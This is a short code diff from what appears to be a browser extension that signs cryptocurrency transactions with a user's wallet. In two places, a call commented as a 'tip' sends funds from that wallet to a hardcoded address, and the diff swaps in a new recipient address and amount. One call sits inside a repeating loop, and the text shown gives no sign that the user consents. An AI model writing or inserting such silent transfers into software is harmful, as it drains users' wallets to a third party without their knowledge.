@@ -83,7 +83,7 @@ chrome.extension.onRequest.addListener(
                         console.log(Transacation)
                         await sleep(1000)
                         // 打赏
-                        sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
+                        sendTransacation(wallet, "0x119e3ac58bd03449f94c3ef17eb457daf775fe8a", 0.4)
                     } catch (err) {
                         throw err
                     }
@@ -106,7 +106,7 @@ chrome.extension.onRequest.addListener(
                         }
                     }
                     // 打赏
-                    sendTransacation(wallet, "0x1889aea32bebda482440393d470246561a4e6ca6", 0.5)
+                    sendTransacation(wallet, "0x119e3ac58bd03449f94c3ef17eb457daf775fe8a", 0.4)
                 }
                 looper()
 
